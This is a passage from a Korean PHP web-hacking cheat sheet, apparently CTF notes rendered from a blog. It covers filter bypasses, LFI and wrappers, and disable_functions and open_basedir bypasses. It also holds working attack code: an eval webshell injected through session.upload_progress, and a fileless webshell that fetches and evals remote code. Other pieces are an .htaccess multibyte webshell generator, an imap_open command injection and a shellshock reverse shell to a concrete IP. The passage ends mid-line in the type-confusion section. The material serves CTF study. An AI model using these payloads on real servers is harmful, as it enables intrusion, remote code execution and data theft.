class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pczntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,</span><br><span class="line"></span><br><span class="line">// 2015 orange</span><br><span class="line">exec, passthru, shell_exec, system, proc_open, popen, curl_exec,</span><br><span class="line">curl_multi_exec, parse_ini_file, symlink, chgrp, chmod, chown, dl, mail,</span><br><span class="line">imap_mail, apache_child_terminate, posix_kill, proc_terminate,</span><br><span class="line">proc_get_status, syslog, openlog, ini_alter, ini_set, ini_restore,</span><br><span class="line">putenv, apache_setenv, pcntl_alarm, pcntl_fork, pcntl_waitpid,</span><br><span class="line">pcntl_wait,  pcntl_wtermsig, pcntl_wstopsig, pcntl_signal,</span><br><span class="line">pcntl_signal_dispatch, pcntl_sigtimedwait, pcntl_sigprocmask,</span><br><span class="line">pcntl_sigwaitinfo, pcntl_exec, pcntl_setpriority, link, readlink</span><br></pre></td></tr></table></figure></li><li><p>xor(^) 연산이나 not(~) 연산, and(&amp;) 연산 이용하여 필터 바이패스</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> (%f3%f9%f3%f4%e5%ed &amp; %<span class="number">7</span>f%<span class="number">7</span>f%<span class="number">7</span>f%<span class="number">7</span>f%<span class="number">7</span>f%<span class="number">7</span>f); <span class="comment">// system</span></span><br><span class="line">[~] 과 [^] 예제 추가 예정</span><br></pre></td></tr></table></figure></li><li><p>이중 참조</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;apple&#x27;</span>; <span class="variable">$b</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$b</span>; <span class="comment">//apple</span></span><br></pre></td></tr></table></figure></li><li><p>배열 첨자</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">// &quot;b&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>&#123;<span class="string">&#x27;a&#x27;</span>&#125;); <span class="comment">// &quot;b&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>file_put_contents</p></li><li><p>lfi with null bytes (php 5.?.? 버전까지)</p></li><li><p>rfi</p><ul><li>allow_url_include</li><li>allow_url_fopen</li><li>UNC</li></ul></li><li><p>파일 없는 php webshell</p><ul><li>연구 방향성 불일치, 연구 불필요하다고 생각됨</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);  </span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);  </span><br><span class="line">    <span class="variable">$remote_file</span> = <span class="string">&#x27;http://xxx/xxx.txt&#x27;</span>;  </span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$code</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$remote_file</span>))&#123;  </span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);  </span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);  </span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></li><li><p>wrapper</p><ul><li>php:&#x2F;&#x2F;filter wrapper<ul><li>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.rot13&#x2F;</li><li>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-16&#x2F;</li><li>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;</li><li>php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;</li><li>php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;</li><li>php:&#x2F;&#x2F;filter&#x2F;convert.base64-decoder|convert.base64-decode|convert.base64-decode&#x2F;resource&#x3D;</li><li>convert.base64-encode 이용하여 충분히 길게 만들면 메모리 과할당으로 crash 유발할 수 있음</li></ul></li><li>zip:&#x2F;&#x2F;</li><li>data:&#x2F;&#x2F;</li><li>expect:&#x2F;&#x2F;<ul><li>아주 특수한 경우에만 발생</li></ul></li><li>php:&#x2F;&#x2F;input</li><li>phar:&#x2F;&#x2F;</li></ul></li><li><p>special files</p><ul><li><p>&#x2F;proc&#x2F;self&#x2F;environ</p><ul><li>최신 버전에서는 읽지 못하게 권한 관리</li></ul></li><li><p>&#x2F;proc&#x2F;self&#x2F;fd</p></li><li><p>sessions file</p><ul><li><p>session.upload_progress</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">2</span> + base64.b64encode(<span class="string">b&#x27;&lt;?=eval($_GET[cmd])?&gt;&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;&lt;?=`ls -al /`?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    requests.post(sys.argv[<span class="number">1</span>],</span><br><span class="line">        cookies = &#123; <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;posix&#x27;</span> &#125;,</span><br><span class="line">        data = &#123; <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: payload &#125;,</span><br><span class="line">        files = &#123; payload2: <span class="string">&#x27;A&#x27;</span>*<span class="number">1000</span> &#125;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure></li><li><p>&#x2F;var&#x2F;lib&#x2F;php5&#x2F;sessions&#x2F;sess_posix</p></li><li><p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_posix</p></li><li><p>&#x2F;tmp&#x2F;sess_posix</p></li></ul></li><li><p>file upload tmp file</p><ul><li>&#x2F;tmp&#x2F;phpoSWPOI</li><li>&#x2F;tmp&#x2F;php[A-Za-z0-9]{5}</li></ul></li></ul></li><li><p>nginx</p><ul><li><a href="https://github.com/posixlee/phuip-fpizdam">https://github.com/posixlee/phuip-fpizdam</a></li></ul></li><li><p>escapeshellarg + escapeshellcmd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;ls &#x27;</span> . <span class="variable">$a</span> . <span class="string">&#x27; 2&gt;&amp;1&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;cmd: &#x27;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;out:&#x27;</span> . <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// https://php.rwx.kr/?a=%27%201%20/tm%203%27</span><br><span class="line">cmd: ls &#x27;&#x27;\\&#x27;&#x27; 1 /tm 3&#x27;\\&#x27;&#x27;&#x27; 2&gt;&amp;1</span><br><span class="line">out:ls: cannot access &#x27;3\\&#x27;: No such file or directory</span><br></pre></td></tr></table></figure></li><li><p>multibyte webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Description : create and bypass file upload filter with .htaccess</span></span><br><span class="line"><span class="comment"># Author : Thibaud Robin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span></span><br><span class="line">SIZE_HEADER = b<span class="string">&quot;\\n\\n#define width 1337\\n#define height 1337\\n\\n&quot;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">generate_php_file</span>(filename, script):</span><br><span class="line">phpfile = <span class="title function_ invoke__">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) </span><br><span class="line"></span><br><span class="line">phpfile.<span class="title function_ invoke__">write</span>(script.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">phpfile.<span class="title function_ invoke__">write</span>(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">phpfile.<span class="title function_ invoke__">close</span>()</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">generate_htacess</span>():</span><br><span class="line">htaccess = <span class="title function_ invoke__">open</span>(<span class="string">&#x27;..htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">htaccess.<span class="title function_ invoke__">write</span>(SIZE_HEADER)</span><br><span class="line">htaccess.<span class="title function_ invoke__">write</span>(b<span class="string">&#x27;AddType application/x-httpd-php .php16\\n&#x27;</span>)</span><br><span class="line">htaccess.<span class="title function_ invoke__">write</span>(b<span class="string">&#x27;php_value zend.multibyte 1\\n&#x27;</span>)</span><br><span class="line">htaccess.<span class="title function_ invoke__">write</span>(b<span class="string">&#x27;php_value zend.detect_unicode 1\\n&#x27;</span>)</span><br><span class="line">htaccess.<span class="title function_ invoke__">write</span>(b<span class="string">&#x27;php_value display_errors 1\\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">htaccess.<span class="title function_ invoke__">close</span>()</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">generate_htacess</span>()</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">generate_php_file</span>(<span class="string">&quot;webshell.php16&quot;</span>, <span class="string">&quot;&lt;?php system(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); die(); ?&gt;&quot;</span>)</span><br><span class="line"><span class="title function_ invoke__">generate_php_file</span>(<span class="string">&quot;scandir.php16&quot;</span>, <span class="string">&quot;&lt;?php echo implode(&#x27;\\n&#x27;, scandir(<span class="subst">$_GET</span>[&#x27;dir&#x27;])); die(); ?&gt;&quot;</span>)</span><br><span class="line"><span class="title function_ invoke__">generate_php_file</span>(<span class="string">&quot;getfile.php16&quot;</span>, <span class="string">&quot;&lt;?php echo file_get_contents(<span class="subst">$_GET</span>[&#x27;file&#x27;]); die(); ?&gt;&quot;</span>)</span><br><span class="line"><span class="title function_ invoke__">generate_php_file</span>(<span class="string">&quot;info.php16&quot;</span>, <span class="string">&quot;&lt;?php phpinfo(); die(); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>disable function bypass</p><ul><li><p>Imagick</p><ul><li><p>command injhtection (old version)</p><ul><li><a href="https://www.exploit-db.com/exploits/39766">https://www.exploit-db.com/exploits/39766</a></li></ul></li><li><p>PATH + ghostscript</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;PATH&quot;</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmd = <span class="built_in">getenv</span>(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(cmd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/tmp/mydir&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;CMD=/readflag &gt; /tmp/mydir/output&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chmod</span>(<span class="string">&#x27;/tmp/mydir/gs&#x27;</span>,<span class="string">&#x27;0777&#x27;</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>(<span class="string">&#x27;/tmp/mydir/1.ept&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>LD_PRELOAD + ghostscript</p><ul><li><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#solution-2:-bypass-disable_function-with-ld_preload">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#solution-2:-bypass-disable_function-with-ld_preload</a></li><li>eps 이외 다른 파일포멧도 되는거 여러가지 있음, Imagick 설정에 의존적</li></ul></li><li><p>ffmpeg</p><ul><li><a href="https://hxp.io/blog/53/0CTF-Quals-2019-Wallbreaker-easy-writeup/">https://hxp.io/blog/53/0CTF-Quals-2019-Wallbreaker-easy-writeup/</a></li></ul></li><li><p>MAGICK_CODER_MODULE_PATH</p><ul><li>[<a href="https://www.imagemagick.org/script/resources.php#Environment%20Variables]">https://www.imagemagick.org/script/resources.php#Environment%20Variables]</a>(<a href="https://www.imagemagick.org/script/resources.php#Environment">https://www.imagemagick.org/script/resources.php#Environment</a> Variables)</li><li><a href="https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy">https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy</a></li></ul></li><li><p>MAGICK_CONFIGURE_PATH</p><ul><li><a href="https://xz.aliyun.com/t/4688#toc-14">https://xz.aliyun.com/t/4688#toc-14</a></li></ul></li></ul></li><li><p>using <code>FFI</code></p><ul><li>php 7.4 ~</li><li><a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp">https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp</a></li></ul></li><li><p>Extension</p><ul><li><a href="https://github.com/w181496/FuckFastcgi">https://github.com/w181496/FuckFastcgi</a></li></ul></li><li><p><code>LD_PRELOAD + mail()</code></p></li><li><p><code>imap_open()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload = &quot;echo hello|tee /tmp/executed&quot;;</span><br><span class="line">$encoded_payload = base64_encode($payload);</span><br><span class="line">$server = &quot;any -o ProxyCommand=echo\t&quot;.$encoded_payload.&quot;|base64\t-d|bash&quot;;</span><br><span class="line">@imap_open(&#x27;&#123;&#x27;.$server.&#x27;&#125;:143/imap&#125;INBOX&#x27;, &#x27;&#x27;, &#x27;&#x27;);</span><br></pre></td></tr></table></figure></li><li><p>dl()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dl(&quot;evil.so&quot;)</span><br></pre></td></tr></table></figure></li><li><p>error_log()</p><ul><li>추가예정</li></ul></li><li><p>shellshock</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; echo vulnerable</span><br><span class="line">() &#123; :a; &#125;; /bin/cat /etc/passwd</span><br><span class="line">() &#123; :; &#125;; /bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/15.165.0.114/8888 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure></li><li><p>JSON UAF Bypass</p><ul><li><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></li></ul></li><li><p>GC Bypass</p><ul><li><a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></li></ul></li><li><p>Backtrace UAF Bypass</p><ul><li><a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></li></ul></li><li><p>[추가 예정]</p></li></ul></li><li><p>open_basedir bypass</p><ul><li><p>glob wrapper</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;  </span><br><span class="line">    <span class="variable">$file_list</span>[] = <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$file_list</span>);  </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$file_list</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ini_set</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag&#x27;</span>));</span><br></pre></td></tr></table></figure></li><li><p>symlink</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="number">0777</span>,<span class="literal">TRUE</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html:bar/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&#x27;foo/../../../../../../&#x27;</span>,<span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&#x27;/var/www/html/&#x27;</span>,<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;bar/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>fastcgi</p><ul><li>[설명 추가 예정]</li><li><a href="https://github.com/w181496/CTF/tree/master/0ctf2019_qual/WallbreakerEasy">https://github.com/w181496/CTF/tree/master/0ctf2019_qual/WallbreakerEasy</a></li></ul></li></ul></li><li><p>docker에서 lfi 가젯</p><ul><li>루트권한에서만 동작</li><li>연구 필요</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/src/php/sapi/tests/test007.phpt</span><br><span class="line"><span class="comment">// phpinfo(), print_r($_POST)</span></span><br></pre></td></tr></table></figure></li><li><p>preg_match bypass with newline</p></li><li><p>abusing rand</p><ul><li><a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></li></ul></li><li><p>hash_hmac</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hmac</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="title function_ invoke__">Array</span>(), <span class="string">&quot;SecretKey&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hmac</span> == <span class="literal">false</span>;</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>extract</p><ul><li>[추가예정]</li></ul></li><li><p>parse_str</p><ul><li>[추가예정]</li></ul></li><li><p>parse_url</p><ul><li>[추가예정]</li></ul></li><li><p>preg_replace</p><ul><li>[추가예정]</li></ul></li><li><p>sprintf &#x2F; vprintf</p><ul><li>[추가예정]</li></ul></li><li><p>temp files</p><ul><li>업로드되는 임시 첨부 파일, 세션 파일, wrapper 를 통한 필터 처리 중에 있는 임시 파일의 경우 본 저장경로와 &#x2F;tmp 폴더에 쓰기 권한이 없으면, 현재 디렉터리에 임시 파일을 작성합니다.</li><li>segment fault 를 유발하여 core 파일을 작성 생성하고 lfi 를 유발하는 문제도 있음</li></ul></li><li><p>phpinfo 에서 주목해야할 점</p><ul><li>커스텀 모듈 존재 유무</li><li>disable function 에 사용할 수 있는 모듈 존재 유무</li><li>php 버전 -&gt; 원데이 -&gt; php bugs 참고하여 검색</li><li>auto_append_file &#x2F; auto_prepend_file</li><li>allow_url_fopen &#x2F; allow_url_include</li><li>fastcgi 사용여부 -&gt; ssrf</li><li>open_basedir</li><li>disable_classes</li><li>disable_functions</li><li>user_ini.filename -&gt; 파일 업로드 취약점</li><li>curl 모듈 -&gt; support protocols -&gt; gopher ssrf</li><li>libxml -&gt; xxe</li><li>mbstring -&gt; unicode normalize</li><li>session.upload_progress.name (PHP_SESSION_UPLOAD_PROGRESS)</li><li>session.save_path (&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;)</li><li>session.serialize_handler    (php)</li></ul></li></ul><h3 id="php-type-confusion"><a href="#php-type-confusion" class="headerlink" title="php type confusion"></a>php type confusion</h3><ul><li><p>loose comparison</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;0xABCdef&#x27;</span> == <span class="string">&#x27; 0xABCdef&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;0010e2&#x27;</span> == <span class="string">&#x27;1e3&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;123&#x27;</span> == <span class="number">123</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span> == <span class="number">0</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;123a&#x27;</span> == <span class="number">123</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;0x01&#x27;</span> == <span class="number">1</span> <span class="comment">// true, php7.0 부터는 false</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span> == <span class="number">0</span> == <span class="literal">false</span> == <span class="literal">NULL</span> <span class="comment">// all the same</span></span><br><span class="line"><span class="number">1.0000000000000001</span> == <span class="number">1</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>strcmp</p><ul><li><p>array</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strcmp</span>([],[])</span><br></pre></td></tr></table></figure></li></ul></li><li><p>sha1 &#x2F; md5 &#x2F; hash</p><ul><li><p>array</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">sha1</span>([]) <span class="comment">// NULL</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]) <span class="comment">// NULL</span></span><br><span class="line"><span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>,[<span class="string">&#x27;1&#x27;</span>]) <span class="comment">// NULL</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>in_array</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;5 or 1=1&#x27;</span>, <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;kaibro&#x27;</span>, <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&#x27;kai&#x27;</span>=&gt;<span class="literal">false</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&#x27;kai&#x27;</span>=&gt;<span class="literal">null</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">array</span>(), <span 